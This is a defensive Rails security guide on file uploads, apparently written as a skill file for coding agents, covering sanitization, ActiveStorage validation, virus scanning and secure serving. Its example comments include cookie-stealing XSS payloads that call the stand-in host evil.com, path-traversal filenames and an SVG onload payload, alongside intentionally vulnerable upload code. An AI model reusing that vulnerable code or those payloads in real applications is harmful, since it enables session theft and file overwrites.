---
name: security-file-uploads
domain: security
dependencies: []
version: 1.0
rails_version: 8.1+
criticality: CRITICAL
---

# Secure File Uploads

Prevent file upload vulnerabilities by validating file types, sanitizing filenames, limiting file sizes, and using ActiveStorage for secure storage.

<when-to-use>
- Accepting ANY file uploads from users
- Implementing profile pictures or avatars
- Building document management systems
- Creating file sharing features
- Allowing image attachments in forms
- ALWAYS - File upload security is ALWAYS required
</when-to-use>

<attack-vectors>
- **Path Traversal** - `../../config/database.yml` overwrites config files
- **Malicious File Types** - `.exe`, `.php`, `.html` files containing malware
- **Content Type Spoofing** - File claims to be image but is actually script
- **Magic Bytes Bypass** - File extension doesn't match actual file type
- **Zip Bombs** - Compressed files that expand to massive sizes
- **XSS via SVG** - SVG files containing embedded JavaScript
- **HTML Injection** - HTML files served with scripts to users
- **Denial of Service** - Large files consuming disk space/memory
</attack-vectors>

<standards>
- NEVER trust user-provided filenames (path traversal risk)
- ALWAYS sanitize filenames (remove path components, special chars)
- PREFER ActiveStorage over manual file handling
- VALIDATE file type by: content type, extension, AND magic bytes
- LIMIT file sizes at application and model levels
- SCAN for viruses in production environments
- SERVE files via controller with proper headers, not from public/
- STORE files outside public directory with signed URLs
- FORCE download (Content-Disposition: attachment) for untrusted types
- USE unique filenames to prevent collisions and overwrites
</standards>

## Vulnerable Patterns

<pattern name="unsanitized-filenames">
<description>NEVER trust user-provided filenames</description>

**CRITICAL VULNERABILITY:**
```ruby
# ❌ CRITICAL - Path traversal attack
def upload_file
  filename = params[:file].original_filename
  File.open("uploads/#{filename}", "wb") do |f|
    f.write(params[:file].read)
  end
end

# Attack: filename = "../../config/database.yml"
# Result: Overwrites database configuration!

# Attack: filename = "../../../public/index.html"
# Result: Overwrites homepage with malicious content!

# Attack: filename = "../../app/views/layouts/application.html.erb"
# Result: Injects code into application layout!
```

**Why Dangerous:**
User controls file path, allowing them to write anywhere the application has permissions.
</pattern>

<pattern name="direct-public-serving">
<description>NEVER serve uploaded files directly from public/</description>

**CRITICAL VULNERABILITY:**
```ruby
# ❌ CRITICAL - XSS via uploaded HTML
def upload
  # Saves to public/uploads/
  path = Rails.root.join("public/uploads/#{params[:file].original_filename}")
  File.open(path, "wb") do |f|
    f.write(params[:file].read)
  end
end

# Attack: User uploads "hack.html" containing:
# <script>
#   // Steal cookies
#   fetch('https://evil.com/steal?cookie=' + document.cookie);
# </script>

# Accessed at: https://yourapp.com/uploads/hack.html
# Result: Script executes in your domain context, stealing user sessions!
```

**Why Dangerous:**
Files in public/ are served directly by web server with your domain's origin, allowing XSS.
</pattern>

## Secure Manual Handling

<pattern name="filename-sanitization">
<description>Sanitize filenames before use (if not using ActiveStorage)</description>

**Secure Filename Sanitization:**
```ruby
# ✅ SECURE - Remove path components and dangerous characters
def sanitize_filename(filename)
  # Remove any path information (handles Windows and Unix paths)
  filename = File.basename(filename)

  # Strip leading/trailing whitespace
  filename = filename.strip

  # Replace all non-alphanumeric, underscore, dash, or period with underscore
  filename = filename.gsub(/[^\w.-]/, "_")

  # Limit length
  filename = filename[0..255]

  # Ensure not empty
  filename = "unnamed" if filename.empty?

  filename
end

# ✅ SECURE - Use unique filename to prevent collisions
def safe_upload
  original_filename = params[:file].original_filename
  safe_filename = sanitize_filename(original_filename)

  # Add unique prefix to prevent overwriting
  unique_filename = "#{SecureRandom.uuid}_#{safe_filename}"

  # Store outside public directory
  storage_path = Rails.root.join("storage/uploads", unique_filename)

  File.open(storage_path, "wb") do |f|
    f.write(params[:file].read)
  end

  unique_filename
end
```

**Why Secure:**
- Removes path traversal attempts
- Prevents special character exploits
- Uses unique names to prevent overwrites
- Stores outside public directory
</pattern>

## ActiveStorage (Recommended)

<pattern name="activestorage-basic">
<description>Use ActiveStorage for automatic security handling</description>

**Setup:**
```bash
# Install ActiveStorage
rails active_storage:install
rails db:migrate
```

**Model with Validation:**
```ruby
# app/models/feedback.rb
class Feedback < ApplicationRecord
  # Single file attachment
  has_one_attached :screenshot

  # Multiple file attachments
  has_many_attached :documents

  # Validate content types (MIME types)
  validates :screenshot,
    content_type: ["image/png", "image/jpeg", "image/gif"],
    size: { less_than: 5.megabytes, message: "must be less than 5MB" }

  validates :documents,
    content_type: ["application/pdf", "text/plain", "application/msword"],
    size: { less_than: 10.megabytes, message: "must be less than 10MB" }
end
```

**Controller:**
```ruby
# app/controllers/feedbacks_controller.rb
class FeedbacksController < ApplicationController
  def create
    @feedback = Feedback.new(feedback_params)

    if @feedback.save
      redirect_to @feedback, notice: "Feedback created with attachments"
    else
      render :new, status: :unprocessable_entity
    end
  end

  private

  def feedback_params
    # Rails 8 expects syntax (replaces strong_parameters)
    params.expect(feedback: [
      :content,
      :recipient_email,
      :screenshot,
      documents: []  # Array for multiple files
    ])
  end
end
```

**View:**
```erb
<%# app/views/feedbacks/_form.html.erb %>
<%= form_with model: @feedback do |f| %>
  <div>
    <%= f.label :screenshot %>
    <%# accept attribute provides client-side filtering %>
    <%= f.file_field :screenshot, accept: "image/*" %>
  </div>

  <div>
    <%= f.label :documents %>
    <%= f.file_field :documents, multiple: true, accept: ".pdf,.txt,.doc,.docx" %>
  </div>

  <%= f.submit %>
<% end %>
```

**Why Secure:**
- Automatic filename sanitization
- Storage outside public directory
- Signed URLs with expiration
- Built-in virus scanning hooks
- Content type validation
</pattern>

<pattern name="content-type-validation">
<description>Validate file types by content type, extension, AND magic bytes</description>

**Comprehensive Validation:**
```ruby
# app/models/feedback.rb
class Feedback < ApplicationRecord
  has_one_attached :image

  validate :acceptable_image

  private

  def acceptable_image
    return unless image.attached?

    # Validation 1: Check MIME content type
    unless image.content_type.in?(%w[image/jpeg image/png image/gif])
      errors.add(:image, "must be a JPEG, PNG, or GIF")
    end

    # Validation 2: Check file extension
    unless image.filename.to_s.match?(/\.(jpe?g|png|gif)\z/i)
      errors.add(:image, "must have a valid extension (.jpg, .png, .gif)")
    end

    # Validation 3: Verify magic bytes (file signature)
    unless valid_image_signature?
      errors.add(:image, "file signature doesn't match declared type")
    end

    # Validation 4: Check file size
    if image.byte_size > 5.megabytes
      errors.add(:image, "must be less than 5MB")
    end
  end

  def valid_image_signature?
    image.open do |file|
      # Read first 8 bytes to check file signature
      magic_bytes = file.read(8)
      return false unless magic_bytes

      # Check magic bytes for known image formats
      # JPEG: FF D8 FF
      # PNG: 89 50 4E 47 0D 0A 1A 0A
      # GIF: 47 49 46 38 (GIF8)
      magic_bytes[0..2] == "\xFF\xD8\xFF" ||   # JPEG
        magic_bytes[0..7] == "\x89PNG\r\n\x1A\n" ||  # PNG
        magic_bytes[0..3] == "GIF8"              # GIF87a or GIF89a
    end
  rescue => e
    Rails.logger.error("Image validation error: #{e.message}")
    false
  end
end
```

**Why Triple Validation:**
1. Content-Type can be spoofed by attacker
2. Extension can be faked (.php renamed to .jpg)
3. Magic bytes verify actual file format
</pattern>

<pattern name="dangerous-file-types">
<description>Force binary download for dangerous file types</description>

**Configuration:**
```ruby
# config/initializers/active_storage.rb

# Force download (not inline display) for these content types
Rails.application.config.active_storage.content_types_to_serve_as_binary.tap do |types|
  # SVG can contain embedded JavaScript
  types << "image/svg+xml"

  # HTML files can execute scripts
  types << "text/html"
  types << "application/xhtml+xml"

  # XML can contain entities and scripts
  types << "text/xml"
  types << "application/xml"

  # JavaScript files
  types << "application/javascript"
  types << "text/javascript"
end

# Set default Content-Disposition to attachment
Rails.application.config.active_storage.content_types_allowed_inline = %w[
  image/png
  image/jpeg
  image/gif
  image/bmp
  image/webp
  application/pdf
]
```

**Why Important:**
SVG and HTML files can contain JavaScript that executes when viewed, enabling XSS attacks.
</pattern>

## Virus Scanning

<pattern name="virus-scanning-production">
<description>Scan uploaded files for malware in production</description>

**Setup ClamAV:**
```ruby
# Gemfile
gem "clamby"

# After bundle install
# Install ClamAV on server:
# Ubuntu: apt-get install clamav clamav-daemon
# macOS: brew install clamav
```

**Model Validation:**
```ruby
# app/models/feedback.rb
class Feedback < ApplicationRecord
  has_one_attached :file

  validate :file_not_infected, if: -> { file.attached? }

  private

  def file_not_infected
    return unless Rails.env.production? # Only scan in production

    file.open do |temp_file|
      unless Clamby.safe?(temp_file.path)
        errors.add(:file, "contains malware or virus")

        # Log security incident
        Rails.logger.warn(
          "Malware detected: user_id=#{user_id}, " \
          "filename=#{file.filename}, " \
          "content_type=#{file.content_type}"
        )
      end
    end
  rescue Clamby::ClambyScanError => e
    # Don't block upload if scanner fails, but log error
    Rails.logger.error("Virus scan failed: #{e.message}")
  end
end
```

**Background Job:**
```ruby
# app/jobs/virus_scan_job.rb
class VirusScanJob < ApplicationJob
  queue_as :security

  def perform(attachment_id)
    attachment = ActiveStorage::Attachment.find(attachment_id)

    attachment.blob.open do |file|
      unless Clamby.safe?(file.path)
        # Quarantine the file
        attachment.purge

        # Notify admin
        AdminMailer.malware_detected(attachment).deliver_later
      end
    end
  end
end

# Enqueue after upload
after_create_commit :scan_for_viruses

def scan_for_viruses
  VirusScanJob.perform_later(file.id) if file.attached?
end
```

**Why Critical:**
Uploaded files can contain viruses, ransomware, or other malware that could infect users or servers.
</pattern>

## Secure File Serving

<pattern name="controller-based-serving">
<description>Serve files via controller with proper security headers</description>

**Download Controller:**
```ruby
# app/controllers/downloads_controller.rb
class DownloadsController < ApplicationController
  before_action :authenticate_user!

  def show
    @feedback = Feedback.find(params[:feedback_id])

    # Authorization check
    unless can_download?(@feedback)
      head :forbidden
      return
    end

    @document = @feedback.documents.find(params[:id])

    # Send file with secure headers
    send_data @document.download,
              filename: sanitized_filename(@document.filename.to_s),
              type: @document.content_type,
              disposition: "attachment"  # Force download, never inline
  end

  private

  def can_download?(feedback)
    # Implement authorization logic
    feedback.user == current_user || current_user.admin?
  end

  def sanitized_filename(filename)
    # Sanitize filename for Content-Disposition header
    filename.gsub(/[^\w.-]/, "_")
  end
end
```

**Routes:**
```ruby
# config/routes.rb
resources :feedbacks do
  resources :downloads, only: [:show]
end
```

**View:**
```erb
<%# app/views/feedbacks/show.html.erb %>
<% @feedback.documents.each do |document| %>
  <div class="document">
    <%= link_to document.filename,
                feedback_download_path(@feedback, document),
                class: "download-link" %>
    <span class="size"><%= number_to_human_size(document.byte_size) %></span>
  </div>
<% end %>
```

**Why Secure:**
- Authentication required
- Authorization enforced
- Content-Disposition: attachment prevents XSS
- Controller-based serving allows access control
- Sanitized filename prevents header injection
</pattern>

<pattern name="signed-urls">
<description>Use signed URLs for temporary access (ActiveStorage)</description>

**Signed URL Generation:**
```ruby
# ActiveStorage generates signed URLs automatically
<%= image_tag @feedback.screenshot %>
# Generates: /rails/active_storage/blobs/redirect/[signed_token]/filename.jpg

# Explicit signed URL with expiration
url = rails_blob_url(@feedback.screenshot, expires_in: 1.hour)

# For direct S3 access (if configured)
url = @feedback.screenshot.url(expires_in: 30.minutes)
```

**Direct Upload Configuration:**
```yaml
# config/storage.yml
amazon:
  service: S3
  access_key_id: <%= Rails.application.credentials.dig(:aws, :access_key_id) %>
  secret_access_key: <%= Rails.application.credentials.dig(:aws, :secret_access_key) %>
  region: us-east-1
  bucket: my-app-uploads-<%= Rails.env %>

local:
  service: Disk
  root: <%= Rails.root.join("storage") %>
```

**Production Configuration:**
```ruby
# config/environments/production.rb
config.active_storage.service = :amazon

# Serve files through Rails (with authentication)
# Not directly from S3
config.active_storage.resolve_model_to_route = :rails_storage_redirect
```

**Why Secure:**
- URLs expire automatically (no hotlinking)
- Access control via Rails authentication
- Files not directly accessible
- Works with CDN while maintaining security
</pattern>

## File Size Limits

<pattern name="size-limits">
<description>Implement multiple layers of file size protection</description>

**Application-Wide Limit:**
```ruby
# config/application.rb
module MyApp
  class Application < Rails::Application
    # Global ActiveStorage limit
    config.active_storage.max_file_size = 100.megabytes
  end
end
```

**Web Server Limit (Nginx):**
```nginx
# /etc/nginx/nginx.conf
http {
  # Limit request body size (affects file uploads)
  client_max_body_size 100M;
}
```

**Model-Specific Limits:**
```ruby
# app/models/feedback.rb
class Feedback < ApplicationRecord
  has_one_attached :avatar
  has_one_attached :document
  has_many_attached :photos

  # Different limits for different file types
  validates :avatar,
    size: { less_than: 2.megabytes, message: "must be less than 2MB" }

  validates :document,
    size: { less_than: 10.megabytes, message: "must be less than 10MB" }

  validates :photos,
    size: { less_than: 5.megabytes, message: "each photo must be less than 5MB" },
    limit: { max: 10, message: "can't attach more than 10 photos" }
end
```

**Controller Validation:**
```ruby
# app/controllers/feedbacks_controller.rb
class FeedbacksController < ApplicationController
  # Middleware to reject large requests early
  before_action :check_file_size, only: [:create, :update]

  private

  def check_file_size
    # Check total request size
    if request.content_length > 50.megabytes
      render json: { error: "Total upload size too large" },
             status: :payload_too_large
    end
  end
end
```

**Why Multiple Layers:**
- Web server rejects huge uploads before Rails processes them
- Application-wide limit prevents resource exhaustion
- Model-specific limits enforce business rules
- Early controller check improves user experience
</pattern>

## Image Processing Security

<pattern name="safe-image-processing">
<description>Use ActiveStorage variants for secure image processing</description>

**Model Variants:**
```ruby
# app/models/feedback.rb
class Feedback < ApplicationRecord
  has_one_attached :image

  # Define secure variants (processed on demand)
  def thumbnail
    image.variant(
      resize_to_limit: [100, 100],
      format: :png,
      saver: { quality: 85 }
    )
  end

  def medium
    image.variant(
      resize_to_limit: [400, 400],
      format: :png
    )
  end

  def large
    image.variant(
      resize_to_limit: [800, 600],
      format: :png
    )
  end
end
```

**View:**
```erb
<%# app/views/feedbacks/show.html.erb %>
<div class="feedback-images">
  <%# Thumbnail in list %>
  <%= image_tag @feedback.thumbnail, alt: "Feedback screenshot" %>

  <%# Link to larger version %>
  <%= link_to image_tag(@feedback.medium),
              rails_blob_path(@feedback.image, disposition: "attachment") %>
</div>
```

**Direct Variant Processing:**
```ruby
# app/controllers/images_controller.rb
class ImagesController < ApplicationController
  def show
    feedback = Feedback.find(params[:feedback_id])
    variant = feedback.image.variant(resize_to_limit: [800, 600])

    redirect_to rails_blob_url(variant)
  end
end
```

**Why Secure:**
- Image processing libraries (libvips/ImageMagick) properly handle malformed images
- Variants re-encode images, stripping metadata and potential exploits
- Format conversion prevents format-specific attacks
- On-demand processing limits resource usage
</pattern>

<antipatterns>
<antipattern>
<description>Trusting user-provided filenames</description>
<reason>CRITICAL - Enables path traversal and file overwrite attacks</reason>
<bad-example>
```ruby
# ❌ CRITICAL VULNERABILITY
def upload
  filename = params[:file].original_filename
  File.open("uploads/#{filename}", "wb") do |f|
    f.write(params[:file].read)
  end
end

# Attack: filename = "../../config/secrets.yml"
# Result: Overwrites application secrets!
```
</bad-example>
<good-example>
```ruby
# ✅ SECURE - Sanitize and use unique names
def upload
  safe_name = sanitize_filename(params[:file].original_filename)
  unique_name = "#{SecureRandom.uuid}_#{safe_name}"
  path = Rails.root.join("storage/uploads", unique_name)

  File.open(path, "wb") do |f|
    f.write(params[:file].read)
  end
end

# ✅ BETTER - Use ActiveStorage
has_one_attached :file
```
</good-example>
</antipattern>

<antipattern>
<description>Only validating content type</description>
<reason>Content-Type header is easily spoofed by attackers</reason>
<bad-example>
```ruby
# ❌ VULNERABLE - Only checks Content-Type header
class Feedback < ApplicationRecord
  has_one_attached :image

  validates :image, content_type: ["image/jpeg", "image/png"]
end

# Attack: Upload malicious.php with Content-Type: image/jpeg
# Result: PHP file stored, potentially executed if served incorrectly
```
</bad-example>
<good-example>
```ruby
# ✅ SECURE - Triple validation
class Feedback < ApplicationRecord
  has_one_attached :image

  validate :secure_image_validation

  private

  def secure_image_validation
    return unless image.attached?

    # Check 1: Content type
    unless image.content_type.in?(%w[image/jpeg image/png image/gif])
      errors.add(:image, "must be an image")
    end

    # Check 2: Extension
    unless image.filename.to_s.match?(/\.(jpe?g|png|gif)\z/i)
      errors.add(:image, "invalid file extension")
    end

    # Check 3: Magic bytes
    image.open do |file|
      magic = file.read(8)
      unless magic&.start_with?("\xFF\xD8\xFF") || # JPEG
             magic&.start_with?("\x89PNG") ||      # PNG
             magic&.start_with?("GIF8")            # GIF
        errors.add(:image, "file signature invalid")
      end
    end
  end
end
```
</good-example>
</antipattern>

<antipattern>
<description>Serving uploaded files from public directory</description>
<reason>Allows XSS via uploaded HTML/SVG files</reason>
<bad-example>
```ruby
# ❌ CRITICAL VULNERABILITY
def upload
  # Saves to public/uploads/
  path = Rails.root.join("public/uploads", params[:file].original_filename)
  File.open(path, "wb") { |f| f.write(params[:file].read) }
end

# User uploads malicious.html:
# <script>fetch('https://evil.com/steal?data=' + document.cookie)</script>

# File accessible at: https://yourapp.com/uploads/malicious.html
# Result: XSS attack steals user sessions!
```
</bad-example>
<good-example>
```ruby
# ✅ SECURE - Use ActiveStorage (stores outside public/)
class Feedback < ApplicationRecord
  has_one_attached :file
end

# ✅ SECURE - Serve via controller with Content-Disposition: attachment
def download
  feedback = Feedback.find(params[:id])
  send_data feedback.file.download,
            filename: feedback.file.filename.to_s,
            type: feedback.file.content_type,
            disposition: "attachment"  # Force download
end
```
</good-example>
</antipattern>

<antipattern>
<description>No file size limits</description>
<reason>Enables denial of service via disk space exhaustion</reason>
<bad-example>
```ruby
# ❌ VULNERABLE - No size limits
class Feedback < ApplicationRecord
  has_one_attached :file
  # No validations!
end

# Attack: Upload 10GB file repeatedly
# Result: Fills disk, crashes application
```
</bad-example>
<good-example>
```ruby
# ✅ SECURE - Multiple size limit layers
# Application-wide
config.active_storage.max_file_size = 100.megabytes

# Model-specific
class Feedback < ApplicationRecord
  has_one_attached :file

  validates :file,
    size: { less_than: 10.megabytes, message: "must be less than 10MB" }
end

# Web server (nginx)
client_max_body_size 50M;
```
</good-example>
</antipattern>

<antipattern>
<description>Allowing SVG uploads without sanitization</description>
<reason>SVG files can contain embedded JavaScript</reason>
<bad-example>
```ruby
# ❌ VULNERABLE - Allows SVG inline display
class User < ApplicationRecord
  has_one_attached :avatar

  validates :avatar,
    content_type: ["image/png", "image/jpeg", "image/svg+xml"]
end

# Attack: Upload SVG with embedded script:
# <svg onload="alert(document.cookie)">
# Result: XSS when SVG is displayed
```
</bad-example>
<good-example>
```ruby
# ✅ SECURE - Exclude SVG or force download
class User < ApplicationRecord
  has_one_attached :avatar

  # Option 1: Don't allow SVG
  validates :avatar,
    content_type: ["image/png", "image/jpeg", "image/gif"]

  # Option 2: Force SVG as binary download
  # In initializer:
  Rails.application.config.active_storage.content_types_to_serve_as_binary << "image/svg+xml"
end
```
</good-example>
</antipattern>
</antipatterns>

<testing>
Test file upload security comprehensively:

```ruby
# test/models/feedback_test.rb
class FeedbackTest < ActiveSupport::TestCase
  test "accepts valid image" do
    feedback = Feedback.new(content: "Test", recipient_email: "user@example.com")
    feedback.image.attach(
      io: File.open(Rails.root.join("test/fixtures/files/valid.jpg")),
      filename: "valid.jpg",
      content_type: "image/jpeg"
    )

    assert feedback.valid?
    assert feedback.image.attached?
  end

  test "rejects invalid content type" do
    feedback = Feedback.new(content: "Test", recipient_email: "user@example.com")
    feedback.image.attach(
      io: File.open(Rails.root.join("test/fixtures/files/script.exe")),
      filename: "malicious.exe",
      content_type: "application/x-msdownload"
    )

    assert_not feedback.valid?
    assert_includes feedback.errors[:image], "must be a JPEG, PNG, or GIF"
  end

  test "rejects file with wrong extension" do
    feedback = Feedback.new(content: "Test", recipient_email: "user@example.com")
    feedback.image.attach(
      io: StringIO.new("fake image content"),
      filename: "script.php",
      content_type: "image/jpeg"  # Lying about type
    )

    assert_not feedback.valid?
    assert_includes feedback.errors[:image], "must have a valid extension"
  end

  test "rejects file with spoofed magic bytes" do
    feedback = Feedback.new(content: "Test", recipient_email: "user@example.com")

    # Create file with wrong magic bytes
    fake_image = StringIO.new("Not a real image")
    feedback.image.attach(
      io: fake_image,
      filename: "fake.jpg",
      content_type: "image/jpeg"
    )

    assert_not feedback.valid?
    assert_includes feedback.errors[:image], "file signature doesn't match"
  end

  test "rejects oversized file" do
    feedback = Feedback.new(content: "Test", recipient_email: "user@example.com")

    # Create large file
    large_file = Tempfile.new(["large", ".jpg"])
    large_file.write("x" * 6.megabytes)
    large_file.rewind

    feedback.image.attach(
      io: large_file,
      filename: "huge.jpg",
      content_type: "image/jpeg"
    )

    assert_not feedback.valid?
    assert_includes feedback.errors[:image], "must be less than 5MB"
  ensure
    large_file.close
    large_file.unlink
  end

  test "sanitizes malicious filename" do
    feedback = Feedback.new(content: "Test", recipient_email: "user@example.com")

    malicious_name = "../../config/database.yml"
    feedback.image.attach(
      io: File.open(Rails.root.join("test/fixtures/files/valid.jpg")),
      filename: malicious_name,
      content_type: "image/jpeg"
    )

    # ActiveStorage sanitizes automatically
    assert feedback.valid?
    assert_not_equal malicious_name, feedback.image.filename.to_s
    assert_not_includes feedback.image.filename.to_s, "../"
  end
end

# test/system/file_uploads_test.rb
class FileUploadsTest < ApplicationSystemTestCase
  test "user can upload valid image" do
    visit new_feedback_path

    fill_in "Content", with: "Test feedback"
    fill_in "Recipient email", with: "user@example.com"

    attach_file "Screenshot",
                Rails.root.join("test/fixtures/files/valid.jpg")

    click_button "Create Feedback"

    assert_text "Feedback was successfully created"
    assert_selector "img[src*='valid.jpg']"
  end

  test "user cannot upload executable file" do
    visit new_feedback_path

    fill_in "Content", with: "Test feedback"
    fill_in "Recipient email", with: "user@example.com"

    attach_file "Screenshot",
                Rails.root.join("test/fixtures/files/malicious.exe")

    click_button "Create Feedback"

    assert_text "Image must be a JPEG, PNG, or GIF"
    assert_no_selector "img[src*='malicious']"
  end
end

# test/controllers/downloads_controller_test.rb
class DownloadsControllerTest < ActionDispatch::IntegrationTest
  test "requires authentication" do
    feedback = feedbacks(:one)
    document = feedback.documents.first

    get feedback_download_path(feedback, document)

    assert_redirected_to login_path
  end

  test "enforces authorization" do
    sign_in users(:user)
    other_feedback = feedbacks(:other_user_feedback)

    get feedback_download_path(other_feedback, other_feedback.documents.first)

    assert_response :forbidden
  end

  test "serves file with secure headers" do
    sign_in users(:user)
    feedback = users(:user).feedbacks.first
    document = feedback.documents.first

    get feedback_download_path(feedback, document)

    assert_response :success
    assert_equal "attachment", response.headers["Content-Disposition"].split(";").first
    assert_equal document.content_type, response.headers["Content-Type"]
  end
end
```

**Test Fixtures:**
```ruby
# test/fixtures/files/
# - valid.jpg (real JPEG with proper magic bytes)
# - valid.png (real PNG)
# - malicious.exe (or create fake one)
# - script.php (text file for extension testing)
# - large.jpg (generated in test for size testing)
```
</testing>

<related-skills>
- security-xss - Prevent script injection
- security-csrf - CSRF protection for uploads
- strong-parameters - Filter upload parameters
- activestorage-basics - ActiveStorage fundamentals
</related-skills>

<resources>
- [Rails Security Guide - File Uploads](https://guides.rubyonrails.org/security.html#file-uploads)
- [ActiveStorage Guide](https://guides.rubyonrails.org/active_storage_overview.html)
- [OWASP - Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
- [File Upload Security Best Practices](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)
</resources>
